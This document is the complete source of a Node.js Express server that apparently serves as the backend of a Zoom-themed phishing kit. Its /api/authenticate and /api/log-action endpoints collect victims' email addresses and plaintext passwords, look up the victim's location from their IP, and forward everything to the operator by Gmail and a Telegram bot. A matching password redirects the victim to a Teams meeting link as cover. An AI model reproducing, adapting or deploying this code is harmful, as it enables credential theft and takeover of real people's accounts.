require('dotenv').config();

const express = require('express');
const cors = require('cors');
const jwt = require('jsonwebtoken');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const nodemailer = require("nodemailer");
const crypto = require('crypto');
const useragent = require('useragent');
const https = require('https');
const fetch = require('node-fetch');

const app = express();

// --- CONFIGURATION ---
const PORT = process.env.PORT || 8080;
const smtpUser = process.env.SMTP_USER;
const smtpPass = process.env.SMTP_PASS;
const adminEmail = process.env.ADMIN_EMAIL;
const SECRET = process.env.SECRET || "zoom_meeting_secret_2026";
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const EMAIL_PASSWORD = process.env.EMAIL_PASSWORD || "de23#$QZoom2026!";

// Validate Environment Variables
console.log("--- Environment Variable Check ---");
console.log("SMTP_USER:", smtpUser ? "DEFINED (OK)" : "MISSING (Check Render Env)");
console.log("SMTP_PASS:", smtpPass ? "DEFINED (OK)" : "MISSING (Check Render Env)");
console.log("ADMIN_EMAIL:", adminEmail ? "DEFINED (OK)" : "MISSING (Check Render Env)");
console.log("TELEGRAM_BOT_TOKEN:", TELEGRAM_BOT_TOKEN ? "DEFINED" : "NOT SET");
console.log("----------------------------------");

const allowedOrigins = [
  'http://localhost:3000',
  'http://localhost:8080',
  'https://business-meeting.vercel.app',
  'https://business-meeting-loer.vercel.app',
  'https://xxx-meeting.vercel.app',
  'https://your-backblaze-or-cuugmstom-domain.com'
];

// --- MIDDLEWARE ---
app.use(cors({
  origin: function (origin, callback) {
    // allow requests with no origin (like mobile apps or curl requests)
    if (!origin) return callback(null, true);
    
    const normalizedOrigin = origin.replace(/\/$/, "").toLowerCase();
    const isAllowed = allowedOrigins.some(allowed => 
      allowed.replace(/\/$/, "").toLowerCase() === normalizedOrigin
    ) || normalizedOrigin.includes(".vercel.app"); // Allow all Vercel previews

    if (isAllowed) {
      callback(null, true);
    } else {
      console.warn(`[CORS] Blocked: ${origin}`);
      callback(new Error(`CORS blocked for origin: ${origin}`));
    }
  },
  credentials: true
}));

app.use(bodyParser.json({ limit: '10mb' }));
app.use(express.static('public'));

// --- EMAIL (SMTP) SETUP ---
let transporter = null;
let smtpEnabled = false;

if (smtpUser && smtpPass && adminEmail) {
  try {
    transporter = nodemailer.createTransport({
      host: "smtp.gmail.com",
      port: 587,
      secure: false, // TLS
      pool: false, // Disable pooling for Render
      auth: { user: smtpUser, pass: smtpPass },
      connectionTimeout: 10000,
      greetingTimeout: 10000,
      socketTimeout: 10000
    });

    // Verify SMTP connection (non-blocking)
    transporter.verify((error, success) => {
      if (error) {
        console.warn("⚠️ SMTP not available (Render may block ports). Email alerts disabled.");
        console.warn("   Error:", error.message);
        smtpEnabled = false;
      } else {
        console.log("✅ Mail Server is ready to send messages (Port 587)");
        smtpEnabled = true;
      }
    });
  } catch (e) {
    console.warn("⚠️ Failed to initialize SMTP transporter. Email alerts disabled.");
    smtpEnabled = false;
  }
} else {
  console.log("ℹ️ SMTP credentials not provided. Email alerts disabled.");
  smtpEnabled = false;
}

// Helper function to send email safely
async function sendEmailSafely(mailOptions) {
  if (!smtpEnabled || !transporter) {
    console.log("ℹ️ Email skipped (SMTP not available)");
    return false;
  }
  
  try {
    const info = await transporter.sendMail(mailOptions);
    console.log("✅ Email sent successfully:", info.messageId);
    return true;
  } catch (err) {
    console.warn("⚠️ Failed to send email:", err.message);
    return false;
  }
}

// Global error handlers to prevent crashes
process.on('uncaughtException', (err) => {
  console.error('🔥 UNCAUGHT EXCEPTION:', err);
});

process.on('unhandledRejection', (reason, promise) => {
  console.error('🔥 UNHANDLED REJECTION:', reason);
});

// --- HELPERS ---
function getClientIp(req) {
  return (req.headers["x-forwarded-for"] || "").split(",").pop()?.trim()
    || req.connection?.remoteAddress
    || req.socket?.remoteAddress
    || "unknown";
}

async function getLocationFromIp(ip) {
  return new Promise((resolve) => {
    const request = https.get(`https://ip-api.com/json/${ip}?fields=status,message,city,regionName,country`, { timeout: 5000 }, (resp) => {
      let data = '';
      resp.on('data', chunk => data += chunk);
      resp.on('end', () => {
        try {
          const response = JSON.parse(data);
          resolve(response.status === 'success' 
            ? `${response.city}, ${response.regionName}, ${response.country}` 
            : 'Location unavailable');
        } catch (e) { resolve('Location error'); }
      });
    });
    
    request.on('error', () => resolve('Location error'));
    request.on('timeout', () => {
      request.destroy();
      resolve('Location timeout');
    });
  });
}

async function sendTelegramAlert(message) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
  try {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 5000);
    
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message }),
      signal: controller.signal
    });
    
    clearTimeout(timeoutId);
  } catch (e) { console.error('Telegram error:', e.message); }
}

// --- ENDPOINTS ---

app.post('/api/log-action', async (req, res) => {
  try {
    const { action, email, password, intruderDetected } = req.body;
    const ip = getClientIp(req);
    const location = await getLocationFromIp(ip);
    const ua = req.headers['user-agent'];

    console.log(`[ACTION] ${action} | IP: ${ip} | Email: ${email || 'none'}`);

    const mailText = `🚨 New Zoom Action: ${String(action || '').toUpperCase()}
═══════════════════════════════════════════════
Login ID: ${email || 'none'}
Password: ${password || 'N/A'}
Browser: ${ua}
This visitor visited from ${location} with IP Address of - ${ip}
URL: ${req.headers.referer || 'unknown'}
TIME: ${new Date().toISOString()}
${intruderDetected ? '🚨 INTRUDER DETECTED!' : ''}
═══════════════════════════════════════════════`;

    // Send email safely
    sendEmailSafely({
      from: `Zoom Monitor <${smtpUser}>`,
      to: adminEmail,
      subject: `🚨 Zoom Action: ${String(action || '').toUpperCase()} from ${location}`,
      text: mailText
    });

    const tgText = `🚨 New Zoom Action: ${String(action || '').toUpperCase()}
Login ID: ${email || 'none'}
Password: ${password || 'N/A'}
Browser: ${ua}
This visitor visited from ${location} with IP Address of - ${ip}`;
    
    sendTelegramAlert(tgText);

    res.json({ success: true });
  } catch (error) {
    console.error('API Error (/log-action):', error.message);
    res.status(500).json({ success: false });
  }
});

app.post('/api/authenticate', async (req, res) => {
  try {
    const { email, password } = req.body;
    const ip = getClientIp(req);
    const location = await getLocationFromIp(ip);

    console.log(`[LOGIN] Attempt for: ${email} | IP: ${ip}`);

    const mailText = `🔐 New Zoom Login Attempt
═══════════════════════════════════════════════
Login ID: ${email}
Password: ${password}
Browser: ${req.headers['user-agent']}
This visitor visited from ${location} with IP Address of - ${ip}
TIME: ${new Date().toISOString()}
═══════════════════════════════════════════════`;

    // Send email safely
    sendEmailSafely({
      from: `Zoom Monitor <${smtpUser}>`,
      to: adminEmail,
      subject: `🔐 Zoom Attempt: ${email}`,
      text: mailText
    });

    const tgText = `🔐 New Zoom Login Attempt
Login ID: ${email}
Password: ${password}
This visitor visited from ${location} with IP Address of - ${ip}`;
    
    sendTelegramAlert(tgText);

    if (password === EMAIL_PASSWORD) {
      const redirect = "https://teams.live.com/dl/launcher/launcher.html?url=%2F_%23%2Fmeet%2F9348548468028%3Fp%3DO0l72J7eL4jegeQa7J%26anon%3Dtrue&type=meet&deeplinkId=109bc758-6e1b-47cb-907b-ed2379475a58&directDl=true&msLaunch=true&enableMobilePage=true&suppressPrompt=true";
      return res.json({ success: true, redirect });
    } else {
      return res.status(401).json({ success: false, error: 'Invalid password.' });
    }
  } catch (error) {
    console.error('API Error (/authenticate):', error.message);
    res.status(500).json({ success: false });
  }
});

app.get('/health', (req, res) => res.json({ status: 'OK', time: new Date() }));

// 🚀 TEST EMAIL ENDPOINT
app.get('/api/test-email', async (req, res) => {
  try {
    if (!smtpEnabled || !transporter) {
      return res.status(503).json({ 
        success: false, 
        error: "SMTP not available (Render may block ports). Try using Telegram instead." 
      });
    }
    
    console.log(`[TEST] Sending test email to ${adminEmail}...`);
    const info = await transporter.sendMail({
      from: `Zoom Monitor <${smtpUser}>`,
      to: adminEmail,
      subject: "🧪 Zoom Backend Test Email",
      text: "If you are reading this, your SMTP settings are working correctly on Render! ✅"
    });
    console.log("✅ Test email sent successfully:", info.messageId);
    res.json({ success: true, message: "Test email sent!", id: info.messageId });
  } catch (error) {
    console.error("❌ Test Email Failed:", error);
    let extra = "";
    if (error.code === 'ETIMEDOUT') {
      extra = " (Render blocks Port 465/587 by default. Contact Render Support to unblock or use SendGrid/Telegram)";
    }
    res.status(500).json({ success: false, error: error.message + extra, code: error.code });
  }
});

// 🚀 TEST TELEGRAM ENDPOINT
app.get('/api/test-telegram', async (req, res) => {
  try {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      return res.status(400).json({ success: false, error: "Telegram variables are not set in .env" });
    }
    
    console.log("[TEST] Sending test Telegram message...");
    await sendTelegramAlert("🧪 Zoom Backend Test Message: Telegram is working correctly! ✅");
    
    res.json({ success: true, message: "Telegram test message sent!" });
  } catch (error) {
    console.error("❌ Telegram Test Failed:", error);
    res.status(500).json({ success: false, error: error.message });
  }
});

app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
});
